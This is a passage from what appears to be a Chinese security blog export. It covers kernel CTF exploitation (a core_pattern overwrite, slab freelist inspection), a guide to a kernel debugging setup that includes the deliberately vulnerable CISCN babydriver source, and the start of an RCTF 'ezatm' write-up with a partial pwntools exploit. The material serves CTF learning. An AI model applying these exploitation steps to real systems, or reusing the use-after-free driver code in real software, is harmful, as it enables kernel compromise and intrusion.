0;\n       *p = 1;\n       return 0;\n   }\n   ```\n\n2. 控制流劫持后改掉内核中core_pattern的值为/tmp/x（即0x782f706d742f7c）\n\n3. 返回shell后，确认core_pattern的值改成功了，并设置ulimit\n\n   ```bash\n   cat /proc/sys/kernel/core_pattern\n   ulimit -c unlimited\n   ```\n\n4. 执行trigger触发coredump\n\n注意：当`CONFIG_STATIC_USERMODEHELPER_PATH=\"\" `被设置后，该方法无法使用。见[do_coredump()函数](https://elixir.bootlin.com/linux/latest/source/fs/coredump.c#L755)\n\n\n参考：\n\n[Linux Kernel PWN | 01 From Zero to One](https://blog.wohin.me/posts/linux-kernel-pwn-01/)\n\n\n# 自问自答\n\n## 如何找到下一个kmalloc将被分配的堆块地址？\n\n1. 先找到`kmem_cache *kmalloc_caches[14]`这个全局变量。它里面存储着不同堆大小（0x8~0x2000）对应的管理结构。\n\n   ```\n   gef➤  p &kmalloc_caches\n   $1 = (struct kmem_cache *(*)[14]) 0xffffffff81e21700 <kmalloc_caches>\n   gef➤  x/20gx 0xFFFFFFFF81E21700\n   0xffffffff81e21700 <kmalloc_caches>:\t0x0000000000000000\t0xffff880002c01a00(0x60)\n   0xffffffff81e21710 <kmalloc_caches+16>:\t0xffff880002c01800(0xc0)\t0xffff880002c01e00(0x8)\n   0xffffffff81e21720 <kmalloc_caches+32>:\t0xffff880002c01d00(0x10)\t0xffff880002c01c00(0x20)\n   0xffffffff81e21730 <kmalloc_caches+48>:\t0xffff880002c01b00(0x40)\t0xffff880002c01900(0x80)\n   0xffffffff81e21740 <kmalloc_caches+64>:\t0xffff880002c01700(0x100)\t0xffff880002c01600(0x200)\n   0xffffffff81e21750 <kmalloc_caches+80>:\t0xffff880002c01500(0x400)\t0xffff880002c01400(0x800)\n   0xffffffff81e21760 <kmalloc_caches+96>:\t0xffff880002c01300(0x1000)\t0xffff880002c01200(0x2000)\n   0xffffffff81e21770 <kmem_cache>:\t0xffff880002c01000\t0x0000000000000004\n   0xffffffff81e21780 <sysctl_compact_memory>:\t0x0000000000000000\t0xffff8800026e6000\n   0xffffffff81e21790 <high_memory>:\t0xffff880003fe0000\t0x0000000000000000\n   ```\n\n   \n\n2. 以0x400（kmalloc-1024）大小的堆为例，查看其管理结构，找到`struct kmem_cache_cpu __percpu *cpu_slab` 和 `struct kmem_cache_node *node[MAX_NUMNODES]`两个对象。\n\n   ```\n   gef➤  p (struct kmem_cache)*0xffff880002c01500\n   $2 = {\n     cpu_slab = 0x18380, \n     flags = 0x40000000, \n     min_partial = 0x5, \n     size = 0x400, \n     object_size = 0x400, \n     offset = 0x0, \n     cpu_partial = 0x6, \n     oo = {\n       x = 0x10008\n     }, \n     max = {\n       x = 0x10008\n     }, \n     min = {\n       x = 0x4\n     }, \n     allocflags = 0x4000, \n     refcount = 0x4, \n     ctor = 0x0 <irq_stack_union>, \n     inuse = 0x400, \n     align = 0x8, \n     reserved = 0x0, \n     name = 0xffffffff81a4c696 \"kmalloc-1024\", \n     list = {\n       next = 0xffff880002c01668, \n       prev = 0xffff880002c01468\n     }, \n     kobj = {\n       name = 0xffff880000a4a190 \":t-0001024\", \n       entry = {\n         next = 0xffff880002c01680, \n         prev = 0xffff880002c01480\n       }, \n       parent = 0xffff880000079558, \n       kset = 0xffff880000079540, \n       ktype = 0xffffffff81b90660 <slab_ktype>, \n       sd = 0xffff8800027103c0, \n       kref = {\n         refcount = {\n           counter = 0x1\n         }\n       }, \n       state_initialized = 0x1, \n       state_in_sysfs = 0x1, \n       state_add_uevent_sent = 0x1, \n       state_remove_uevent_sent = 0x0, \n       uevent_suppress = 0x0\n     }, \n     remote_node_defrag_ratio = 0x3e8, \n     node = {0xffff880002c00d80}\n    }\n   ```\n\n   \n\n3. 解析`kmem_cache_node`结构体，发现其中的双向链表都为空，说明没有链接slab，应该不会从这里分配。\n\n   ```\n   gef➤  p (struct kmem_cache_node)*0xffff880002c00d80\n   $5 = {\n     list_lock = {\n       {\n         rlock = {\n           raw_lock = {\n             val = {\n               counter = 0x0\n             }\n           }\n         }\n       }\n     }, \n     nr_partial = 0x0, \n     partial = {\n       next = 0xffff880002c00d90, \n       prev = 0xffff880002c00d90\n     }, \n     nr_slabs = {\n       counter = 0x23\n     }, \n     total_objects = {\n       counter = 0x118\n     }, \n     full = {\n       next = 0xffff880002c00db0, \n       prev = 0xffff880002c00db0\n     }\n   }\n   ```\n\n   \n\n4. 再查看`kmem_cache_cpu `结构体，可以看到freelist指向`0xffff880000aff400`。此时，当我们在内核中`kmalloc(0x400)`时，就会把`0xffff880000aff400`这个堆块分配给我们使用，并更新freelist指向`0xffff880000aff800`。\n\n   ```\n   gef➤  p/x __per_cpu_offset[0]\n   $6 = 0xffff880003800000\n   gef➤  p (struct kmem_cache_cpu)*(0xffff880003800000+0x18380)\n   $8 = {\n     freelist = 0xffff880000aff400, \n     tid = 0x2dd, \n     page = 0xffffea000002bf80, \n     partial = 0x0 <irq_stack_union>\n   gef➤ x/4gx 0xffff880000aff400\n   0xffff880000aff400:  0xffff880000aff800  0x0000000000000000\n   0xffff880000aff410:  0x0000000000000000  0x0000000000000000\n   ```\n\n   \n\n注意：不同大小的堆块，在内核中管理形式稍稍不一样。更细致的总结需要等我研究完linux内核slub机制之后再写了。\n\n## 如何方便地计算内核结构体大小？\n\n在没有带符号信息的vmlinux情况下，想确切知道系统中某个结构体的大小，可以自己写个内核模块扔进内核打印。\n\n计算结构体大小的内核模块示例，c代码如下\n\n```c\n// test-size.c\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/cred.h>\n#include<linux/tty.h>\n#include<linux/kref.h>\n#include<linux/device.h>\n#include<linux/tty_driver.h>\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstruct cred c1;\nstruct tty_struct t1;\nstruct kref k1;\nstruct device d1;\nstruct tty_driver td1;\n\nstatic int hello_init(void) \n{\n    printk(\"<1> Hello world!\\n\");\n    printk(\"size of cred : %d \\n\",sizeof(c1));\n    printk(\"size of tty_struct: 0x%x \\n\",sizeof(t1));\n    printk(\"size of kref: 0x%x \\n\",sizeof(k1));\n    printk(\"size of device: 0x%x \\n\",sizeof(d1));\n    printk(\"size of tty_driver: 0x%x \\n\",sizeof(td1));\n\n    return 0;\n}\nstatic void hello_exit(void) \n{\n    printk(\"<1> Bye, cruel world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nMakefile如下：\n\n```makefile\nobj-m += test-size.o\n\nKDIR =/lib/modules/$(shell uname -r)/build\n\nall:\n\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n\nclean:\n\trm -rf *.o *.ko *.mod.* *.symvers *.order\n```\n\n在linux 4.4.0-142-generic版本下，计算结果如下：\n\n```\n[26916.070189] <1> Hello world!\n[26916.070192] size of cred : 168 \n[26916.070193] size of tty_struct: 0x2e0 \n[26916.070194] size of kref: 0x4 \n[26916.070194] size of device: 0x2d8 \n[26916.070195] size of tty_driver: 0xb8 \n```\n\n\n\n\n# 参考\n\n[kernel exploit 有用的结构体-bsauce](https://blog.csdn.net/panhewu9919/article/details/118112795)\n\n[kernel exploit 有用的结构体-inquisiter](https://blog.csdn.net/bme314/article/details/120324588)\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"两种方法调试 linux kernel","url":"/2022/12/25/22-12-15-ways-to-debug-linuxkernel/","content":"\n\n\n这篇文章的目的，是构造一个linux内核调试环境的壳，之后只需替换内核，就能完成对不同版本内核的调试。文中涉及编译linux内核、编译busybox生成文件系统、编译内核字符设备ko、以及两种内核调试方法。\n\n本文中用到的环境如下：\n\n- x86_64架构ubuntu16.04虚拟机\n- gcc版本5.4.0\n\n# 编译Linux Kernel\n\n## 说明\n\n编译内核，简单来说包含两个步骤：\n\n（1）配置内核选项\n\n（2）用配置的选项编内核\n\n[配置内核选项的命令](http://embeddedguruji.blogspot.com/2019/01/make-config-vs-oldconfig-vs-defconfig.html) 有若干个，我们应当选择哪个呢？\n\n`make configs`：基于文本形式的配置，每次弹出一个选项，每个选项都需要手动确认。如果想更改前序配置，只能从头再来。\n\n`make menuconfig`：基于图形界面的配置，可以在界面不同选项中来回切换，可以搜索某个选项，可以加载`.config`配置文件。它的GUI界面使用了`ncurses`库，在Ubuntu中可使用`sudo apt install libncurses5-dev`安装。\n\n`make defconfig`：根据`ARCH`指定的架构，用默认选项生成`.config`配置文件。默认的配置存在`arch/$(ARCH)/configs`目录下。\n\n`make oldconfig`：读取已存在的`.config`文件，并提示用户当前kernel的哪些选项在`.config`文件中找不到。\n\n`make savedefconfig`：在当前目录下生成一个`defconfig`文件\n\n## 例子\n\n1. 安装内核编译过程中可能要用到的包\n\n   ```bash\n   sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison\n   ```\n\n2. 下载[linux-4.4.72.tar.gz](https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz)源码包到本地解压、设置、编译\n\n   ```bash\n   tar -zxf linux-4.4.72.tar.gz\n   cd linux-4.4.72\n   make ARCH=x86 defconfig\n   make menuconfig\t\t\t\t# 若无需更改默认配置，这条可省略。\n   make -j4\n   ```\n\n   配置项参考[Linux内核调试](https://xz.aliyun.com/t/2024)，设置如下几个关键选项：\n\n   ```\n   由于我们需要调试内核，注意下面这几项一定要配置好：\n   KernelHacking --> Compile-time checks and compiler options\n   选中Compile the kernel with debug info\n   选中Compile the kernel with frame pointers\n   ```\n\n3. 编译完成后，即可在当前目录下看到`vmlinux`，在`arch/x86/boot`目录下看到`bzImage`。\n\n\n\n\n# 编译busybox\n\n> 通常利用busybox构建文件系统，有两种方式设置启动选项：\n>\n> 1. /init文件：[[内核pwn] 环境搭建](https://www.jianshu.com/p/23351b38ecb0)\n> 2. /etc/init.d/rcS文件：[从零开始的 kernel pwn 入门 - I：Linux kernel 简易食用指南](https://www.anquanke.com/post/id/258874#h3-17)\n\n这里以第一种方式为例，通过以下几个步骤就能构造一个可以使用的文件系统：\n\n1. 下载 [busybox-1.30.0.tar.bz2](https://www.busybox.net/downloads/busybox-1.30.0.tar.bz2)源码包。\n\n2. 以root用户，运行如下命令，解压、设置、编译。\n\n   ```bash\n   su root\n   tar -jxf busybox-1.30.0.tar.bz2\n   make menuconfig\n   # 进Settings，勾上Build static binary (no shared libs),编译成静态文件\n   # 关闭下面两个选项:\n   # Linux System Utilities -> [] Support mounting NFS file system 网络文件系统\n   # Networking Utilities -> [] inetd (Internet超级服务器)\n   make install -j 4\n   # 高版本gcc编译时报错：date.c:(.text.date_main+0x25f): undefined reference to `stime'\n   # 解决：https://git.busybox.net/busybox/patch/?id=d3539be8f27b8cbfdfee460fe08299158f08bcd9\n   # 或者下载新版本的busybox，就不会遇到这个问题\n   ```\n\n3. 进入编译后生成的`_install`目录，里面存放了编译生成的文件，在该目录下创建init文件和需要的文件夹。\n\n   ```bash\n   cd _install\n   mkdir proc\n   mkdir sys\n   touch flag\n   touch init\n   chmod +x init \n   ```\n\n   init中写入如下内容（或者参考其他ctf题目中的init文件）\n\n   ```bash\n   #!/bin/sh\n   \n   mkdir /tmp\n   mount -t proc none /proc\n   mount -t sysfs none /sys\n   mount -t devtmpfs devtmpfs /dev\n   mount -t tmpfs none /tmp\n   mdev -s\n   echo -e \"Boot took $(cut -d' ' -f1 /proc/uptime) seconds\"\n   echo 1 > /proc/sys/vm/unprivileged_userfaultfd\n   \n   insmod /xxx.ko\n   chmod 666 /dev/xxx\n   chmod 740 /flag\n   echo 1 > /proc/sys/kernel/kptr_restrict\n   echo 1 > /proc/sys/kernel/dmesg_restrict\n   chmod 400 /proc/kallsyms\n   \n   #poweroff -d 120 -f &\n   setsid /bin/cttyhack setuidgid 0 /bin/sh\n   \n   umount /proc\n   umount /tmp\n   \n   poweroff -d 0  -f\n   ```\n\n4. 打包生成roofs.cpio\n\n   ```bash\n   find . | cpio -o --format=newc > ../rootfs.cpio\n   ```\n\n   \n\n# 编译漏洞ko\n\n新建一个存放ko源码和Makefile的文件夹\n\n```bash\nmkdir testko\ncd testko\ntouch Makefile\ntouch babydriver.c\n```\n\nMakefile内容如下：\n\n```makefile\nKDIR := /home/bling/Documents/linux-4.4.72\nobj-m += babydriver.o\n\nall:\n\tmake -C $(KDIR) M=$(shell pwd) modules\nclean:\n\tmake -C $(KDIR) M=$(shell pwd) clean\n```\n\n参考 [CISCN2017-babydriver](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver) 这个题，有漏洞的babydrvier.c源码如下：\n\n```c\n#include<linux/init.h>\n#include<linux/module.h>\n#include<linux/kernel.h>\n#include<linux/fs.h>\n#include<asm/uaccess.h>\n#include<linux/io.h>\n#include<linux/cdev.h>\n#include<linux/slab.h>\n#include<linux/device.h>\n\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\n\nstatic int test_major = 0;\nstatic int test_minor = 0;\n\nstatic struct cdev cdev_0;\ndev_t babydev_no;\nstruct class *babydev_class;\n\nstruct babydevice{\n\tchar* device_buf;\n\tuint64_t device_buf_len;\n};\n\nstruct babydevice babydev_struct;\n\n\nint babyrelease(struct inode *inode, struct file *filp)\n{\n\tkfree(babydev_struct.device_buf);\n\tprintk(\"device release\\n\");\n\treturn 0;\n}\n\nint babyopen(struct inode *inode, struct file *filp)\n{\n\tbabydev_struct.device_buf = kmalloc(64,0x24000C0);\n\tbabydev_struct.device_buf_len = 64;\n\tprintk(\"device open\\n\");\n\treturn 0;\n}\n\n\nstatic ssize_t babyread(struct file *file, char *buf, size_t count, loff_t *ppos)\n{\n\tssize_t v6; \n\n\tif ( !babydev_struct.device_buf )\n\t  return -1;\n\tif ( babydev_struct.device_buf_len > count )\n\t{\n\t  v6 = count;\n\t  copy_to_user(buf,babydev_struct.device_buf,v6);\n\t  return v6;\n\t}\n\treturn -2;\n}\n\n\nstatic ssize_t babywrite(struct file *file, const char *buf, size_t count, loff_t *ppos)\n{\n\tssize_t result; \n\tssize_t v6;\t\n\n\tif ( !babydev_struct.device_buf )\n\t  return -1;\n\tresult = -2;\n\tif ( babydev_struct.device_buf_len > count )\n\t{\n\t  v6 = count;\n\t  copy_from_user(babydev_struct.device_buf,buf,v6);\n\t  return v6;\n\t}\n\treturn result;\n}\n\n\nlong babyioctl(struct file *fd, unsigned int cmd, unsigned long arg)\n{\n\tsize_t v4;\t\n\n\tv4 = arg;\n\tif ( cmd == 65537 )\n\t{\n\t  kfree(babydev_struct.device_buf);\n\t  babydev_struct.device_buf = kmalloc(v4,0x24000C0);\n\t  babydev_struct.device_buf_len = v4;\n\t  printk(\"alloc done\\n\");\n\t  return 0LL;\n\t}\n\telse\n\t{\n\t  printk(\"defalut:arg is %ld\",arg);\n\t  return -22;\n\t}\n}\n\nstruct file_operations baby_fops = {\n\t.owner = THIS_MODULE,\n\t.write = babywrite,\n\t.read = babyread,\n\t.unlocked_ioctl = babyioctl,\n\t.open = babyopen,\n\t.release = babyrelease,\n};\n\nstatic int babydriver_init(void) \n{\n\tint v0; \n\tint v1; \n\tstruct device *v2; \n\n\tif( alloc_chrdev_region(&babydev_no, 0, 1, \"babydev\") >= 0 ){\t\t// 申请一个主设备号\n\t\tcdev_init(&cdev_0, &baby_fops);\t\t\t\t\t\t\t\t\t// 初始化字符设备cdev结构体，并建立其与操作方法集的关系\n\t\tcdev_0.owner = THIS_MODULE;\n\t\ttest_major = MAJOR(babydev_no);\n\t\ttest_minor = MINOR(babydev_no);\n\t\tprintk(\"[+] test_major: %d ; test_minor: %d \\n\",test_major,test_minor);\n\t\tv1 = cdev_add(&cdev_0, babydev_no, 1);\t\t\t\t\t\t\t// 将字符设备添加到系统中\n\t\tif ( v1 >= 0 ){\n\t\t\tbabydev_class = class_create(THIS_MODULE, \"babydev_class\");\t\t\t// 创建一个class结构体\n\t\t\tif ( babydev_class ){\n\t\t\t\tv2 = device_create(babydev_class, 0, MKDEV(test_major,0), 0, \"babydev\");\t\t// 自动创建设备节点\n\t\t\t\tif ( v2 ) return 0;\n\t\t\t\tprintk(\"create device failed\");\n\t\t\t\tclass_destroy(babydev_class);\n\t\t\t}else{\n\t\t\t\tprintk(\"create class failed\");\n\t\t\t}\n\t\t\tcdev_del(&cdev_0);\n\t\t} else{\n\t\t\tprintk(\"cdev init failed\");\n\t\t}\n\t\tunregister_chrdev_region(babydev_no, 1);\n\t\treturn v1;\n\t}\n\tprintk(\"alloc_chrdev_region failed\");\n\treturn 1;\n}\n\nstatic void babydriver_exit(void) \n{\n  device_destroy(babydev_class, babydev_no);\t\t// 删除设备\n  class_destroy(babydev_class);\t\t\t\t\t\t// 删除类\n  cdev_del(&cdev_0);\t\t\t\t\t\t\t\t// 删除字符设备\n  unregister_chrdev_region(babydev_no, 1);\t\t\t// 注销设备号\n}\n\nmodule_init(babydriver_init);\nmodule_exit(babydriver_exit);\n```\n\n编译生成babydriver.ko\n\n```\nmake\n```\n\n\n\n# 测试运行\n\n在`_install`目录下，准备好漏洞ko和对应的利用程序，exp参考[第一道内核pwn-CISCN2017-babydriver](https://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/)。并在`/init`中添加对驱动ko的设置。最后，重打包生成cpio。\n\n```bash\n#!/bin/sh\necho \"{==DBG==} INIT SCRIPT\"\nmkdir /tmp\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t debugfs none /sys/kernel/debug\nmount -t tmpfs none /tmp\ninsmod /babydriver.ko           # load ko\nmdev -s                         # We need this to find /dev/sda later\nchmod 777 /dev/babydev\necho -e \"{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds\"\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh             #normal user\n#exec /bin/sh                                           #root\n\numount /proc\numount /sys/kernel/debug\numount /sys\numount /tmp\npoweroff -d 0  -f\n```\n\n启动命令：\n\n```bash\nqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic\n```\n\n\n\n# 调试方法\n\n经过上面的步骤，我们有了内核镜像bzImage、文件系统rootfs.cpio、漏洞模块babydriver.ko、以及带调试信息的vmlinux。因此，我们可以方便地对内核进行调试，这里汇总两个我目前了解到的调试方法。一种是kernel pwn常用的gdb调试，可以精确调试每一行汇编内容。另一种是源码调试，常用于开发场景，便于c语言级别的流程跟踪。\n\n## 二进制调试 - gdb\n\n安装好gdb或gdb插件（peda/gef/pwndbg）后，开启两个窗口，一个窗口运行qemu，另一个窗口运行gdb并加载符号文件。\n\n1. 窗口1\n\n   ```bash\n   qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -S -s\n   ```\n\n2. 窗口2\n\n   ```\n   gdb\n   pwndbg> file ./vmlinux\n   pwndbg> target remote :1234\n   pwndbg> add-symbol-file ./xxx.ko 0xffffffffa0000000\n   pwndbg> b start_kernel\n   pwndbg> c\n   ```\n\n   \n\n## 源码调试 - vscode\n\n待调试内核文件及编译环境在一台ubuntu中，vscode运行在windows中。为了在windows侧调试ubuntu中的目标，需要先配置好两台电脑的环境。\n\n参考文章推荐：\n\n[解决VScode配置远程调试Linux程序的问题](https://cloud.tencent.com/developer/article/1726411)\n\n[手把手教你利用VS Code+Qemu+GDB调试Linux内核](https://zhuanlan.zhihu.com/p/105069730)\n\n### 准备\n\n1. linux侧安装好gdb、gdbserver以及openssh-server\n\n   ```\n   sudo apt update\n   sudo apt install gdb\n   sudo apt install gdbserver\n   sudo apt install openssh-server\n   ```\n\n2. windows侧安装好vscode及插件\n\n   ```\n   安装好vscode后安装如下两个插件：\n   \tRemote Development插件\n   \tC/C++插件\n   ```\n\n3. 配置vscode使用密钥文件连接ubuntu\n\n   ```\n   linux侧放入公钥文件至~/.ssh/authorized_keys\n   windows侧私钥文件在C:\\Users\\xxx\\.ssh\\id_rsa\n   \n   windows的vscode中ssh bling@192.168.133.155，设置好config后，刷新SSH，选中目标ip连接到远程\n   \n   给远程安装C/C++插件，然后就可以打开远程待调试的文件夹\n   ```\n\n   \n\n### 配置\n\n打开待调试的文件夹后，在文件夹下新建`.vscode/launch.json`，并填入如下内容。\n\n```json\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"linux4.4.72-debug\",\n            \"type\": \"cppdbg\",\n            \"request\": \"launch\",\n            \"miDebuggerServerAddress\": \"127.0.0.1:1234\",\n            \"program\": \"${workspaceFolder}/vmlinux\",\n            \"args\": [],\n            \"stopAtEntry\": false,\n            \"cwd\": \"${workspaceFolder}\",\n            \"environment\": [],\n            \"externalConsole\": false,\n            \"logging\": {\n                \"engineLogging\": false\n            },\n            \"MIMode\": \"gdb\",\n        }\n    ]\n}\n```\n\n然后linux侧让qemu以调试模式运行并处于等待，windows侧vscode中设置断点后F5连接过去，即可开始源码调试。\n\n```bash\n# linux侧\nqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -S -s\n\n# windows侧，在代码中下好断点，F5开始调试\n```\n\n\n\n### 问题\n\n**出现错误**：ubuntu16.04上的qemu版本太低，导致gdb调试出现`Remote 'g' packet reply is too long: ...`的问题。\n\n**解决方法**：\n\n1. 在ubuntu20.04中编译静态qemu\n\n   ```bash\n   sudo apt install libpixman-1-dev\n   wget https://download.qemu.org/qemu-4.2.0.tar.xz\n   tar xJf qemu-4.2.0.tar.xz \n   cd qemu-4.2.0/\n   mkdir build\n   cd build\n   ./configure --static\t\t\t# 指定静态编译\n   make -j4\t\t\t\t\t\t# 默认编译所有架构\n   ```\n\n   如果要编译某个特定架构的，\n\n   ```bash\n   ./configure --help | grep \"target-list=LIST\" -A20\t\t# 查看支持哪些架构\n   #  --target-list=LIST       set target list (default: build everything)\n   #                           Available targets: aarch64-softmmu alpha-softmmu \n   #                           arm-softmmu cris-softmmu hppa-softmmu i386-softmmu \n   #                           lm32-softmmu m68k-softmmu microblaze-softmmu \n   #                           microblazeel-softmmu mips-softmmu mips64-softmmu \n   #                           mips64el-softmmu mipsel-softmmu moxie-softmmu \n   #                           nios2-softmmu or1k-softmmu ppc-softmmu ppc64-softmmu \n   #                           riscv32-softmmu riscv64-softmmu s390x-softmmu \n   #                           sh4-softmmu sh4eb-softmmu sparc-softmmu \n   #                           sparc64-softmmu tricore-softmmu unicore32-softmmu \n   #                           x86_64-softmmu xtensa-softmmu xtensaeb-softmmu \n   #                           aarch64-linux-user aarch64_be-linux-user \n   #                           alpha-linux-user arm-linux-user armeb-linux-user \n   #                           cris-linux-user hppa-linux-user i386-linux-user \n   #                           m68k-linux-user microblaze-linux-user \n   #                           microblazeel-linux-user mips-linux-user \n   #                           mips64-linux-user mips64el-linux-user \n   #                           mipsel-linux-user mipsn32-linux-user \n   #                           mipsn32el-linux-user nios2-linux-user \n   #                           or1k-linux-user ppc-linux-user ppc64-linux-user \n   #                           ppc64abi32-linux-user ppc64le-linux-user \n   ./configure --target-list=x86_64-softmmu --static\t\t\t# 假如仅编译x86_64架构的\n   make -j4\n   ```\n\n2. 拷贝对应的文件和文件夹到ubuntu16.04中\n\n   ```bash\n   qemu-4.2.0/build/x86_64-softmmu/qemu-system-x86_64\t# 文件\n   qemu-4.2.0/pc-bios\t\t\t\t\t\t\t\t# 整个文件夹\n   ```\n\n3. 在ubuntu16.04中使用静态编译的4.2.0版本qemu运行kernel\n\n   ```bash\n   ./qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 64M --nographic -L ./pc-bios/ -S -s\n   # 通过-L指定pc-bios目录，使用其中的bios-256k.bin等文件启动系统\n   ```\n\n   \n","tags":["linux kernel"],"categories":["基础技能"]},{"title":"RCTF 2022 PWN ezatm","url":"/2022/12/13/22-12-13-RCTF-ezatm/","content":"\n\n\n\n\n# 题目信息\n\n题目附件：[_media_file_task_ed7e3e0a-e52b-4bc1-8a77-12923072e4a1.zip](_media_file_task_ed7e3e0a-e52b-4bc1-8a77-12923072e4a1.zip)\n\n题目描述：It is illegal to rob a bank, even a ATM. use “./client 139.9.242.36 4445” to run .or “./client 190.92.237.200 4445”\n\n本题是一个server-client的题型，首先想到我们利用的第一步一定是伪造一个client，而不是使用其提供的client来交互。\n\nserver端可以看作一个银行，client未登录到账户时，有4个选项\n\n```c\n        else if ( !memcmp(\"login\", s2, 5uLL) )\n        {\n          v4 = sub_1346(&unk_203178, &qword_203170);\n        }\n        else if ( !memcmp(\"new_account\", s2, 0xBuLL) )// 1\n        {\n          v4 = sub_1483(&unk_203178, &qword_203170, dword_203198);\n        }\n        else if ( !memcmp(\"exit_system\", s2, 0xBuLL) )\n        {\n          return 0LL;\n        }\n        if ( !memcmp(\"stat_query\", s2, 0xAuLL) )\n          sub_1DB1((__int64)&v4);\n```\n\n当client登录进某个账户后，有8个选项\n\n```c\n          if ( !memcmp(\"query\", s2, 5uLL) )\n          {\n            v4 = sub_1731();\n          }\n          else if ( !memcmp(\"transfer_account\", s2, 0x10uLL) )\n          {\n            v4 = sub_1764(&unk_203178);\n          }\n          else if ( !memcmp(\"withdraw_money\", s2, 0xEuLL) )\n          {\n            v4 = sub_1A99();\n          }\n          else if ( !memcmp(\"deposit_money\", s2, 0xDuLL) )\n          {\n            v4 = sub_1BEE((unsigned int)dword_203198);\n          }\n          else if ( !memcmp(\"exit_account\", s2, 0xCuLL) )\n          {\n            v4 = sub_1C8A();\n          }\n          else if ( !memcmp(\"cancellation\", s2, 0xCuLL) )\n          {\n            v4 = sub_1C9F();\n          }\n          else if ( !memcmp(\"update_pwd\", s2, 0xAuLL) )\n          {\n            v4 = sub_197D();\n          }\n          else if ( !memcmp(\"VIP_service\", s2, 0xBuLL) )\n          {\n            sub_1D79();\n          }\n```\n\n创建一个账户的操作，其背后逻辑是：申请一块0x30大小的堆，然后将用户密码，用户名和用户余额信息存入堆中。最后将这个堆的地址存放到bss段`_QWORD qword_2030E0[10]`数组中，最多容纳10个账户。结构如下图所示\n\n![image-20221214205239030](image-20221214205239030.png?size=600)\n\n# 漏洞点\n\n## UAF\n\n在`cancellation`分支中，`free((void *)qword_2030E0[dword_203010]);`后，没有将`qword_2030E0[dword_203010]`置NULL，导致后续操作能访问已释放的堆空间。\n\n## query()信息泄露\n\n该函数每次都会向客户端发送0x84的数据，当我们查询heap信息时，可以泄露下一个heap的信息。\n\n# 利用\n\n## 复用client的creatuuid函数，通过server检查\n\n（1）拷贝IDA中client相关函数的伪代码，编译生成一个lib库。\n\n```c\n// test.c\n// gcc -fPIC -shared -o libtest.so test.c\nchar int_2_char(int a)\n{\n  char result;\n\n  if ( (unsigned int)a <= 9 )\n    return a + 48;\n  switch ( a )\n  {\n    case 10:\n      result = 97;\n      break;\n    case 11:\n      result = 98;\n      break;\n    case 12:\n      result = 99;\n      break;\n    case 13:\n      result = 100;\n      break;\n    case 14:\n      result = 101;\n      break;\n    default:\n      result = 48;\n      break;\n  }\n  return result;\n}\n\nint getrand()\n{\n  return rand() % 15;\n}\n\nchar* creatuuid(char *uuid, unsigned int value)\n{\n  int v1; // ecx\n  char v2; // al\n  int i; // [rsp+1Ch] [rbp-14h]\n\n  srand(value);\n  for ( i = 0; i <= 29; ++i )\n  {\n    if ( uuid[i] != 0x34 && uuid[i] != 0x2D )\n    {\n      if ( uuid[i] == 0x78 )\n      {\n        v1 = getrand();\n        uuid[i] = int_2_char(v1);\n      }\n      else\n      {\n        v2 = getrand();\n        uuid[i] = int_2_char(v2 & 3 | 8);\n      }\n    }\n  }\n  return uuid;\n}\n```\n\n（2）使用python的ctypes模块，加载libtest.so库，并调用creatuuid()函数\n\n```python\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\t\t\t\n    uuid_str = ctypes.create_string_buffer(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\") \n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    sendvalue = uuid_str.value\n    io.send(uuid_str.value)\n    io.recv()\n    return uuid_str.value\n```\n\n\n\n## 利用tcache特性泄露堆地址\n\n```python\nimport random\nimport ctypes\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"127.0.0.1\",4445)\n# io = remote(\"190.92.237.200\",4445)\nio = remote(\"139.9.242.36\",4445)\n\ndef init_func():\n    sd = u32(io.recv(4))\n    print(\"seed value: \",hex(sd))\n    clibrary = ctypes.CDLL(\"./libtest.so\")\t\n    uuid_str = ctypes.c_char_p(b\"yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy\")\n    print(\"before: \",uuid_str.value)\n    clibrary.creatuuid(uuid_str,sd)\n    print(\"after: \",uuid_str.value)\n    sendvalue = uuid_str.value\n    io.send(uuid_str.value)\n    io.recv()\n    return uuid_str.value\n\ndef new_account(password,account_id,money):\n    data1 = b\"\"\n    data1 += b\"new_account\".ljust(16,b\"\\x00\")\n    data1 += password.ljust(8,b\"\\x00\")\n    data1 += account_id.ljust(32,b\"\\x00\")\n    data1 += p32(money)\n    io.sendline(data1)\n    return io.recv()\n\ndef query():\n    data1 = b\"\"\n    data1 += b\"query\".ljust(16,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(8,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(32,b\"\\x00\")\n    data1 += b\"\\x00\".ljust(4,b\"\\x00\")\n    io.sendline(data1)\n    return io.recv()\n\ndef exit_account():\n    data1 = 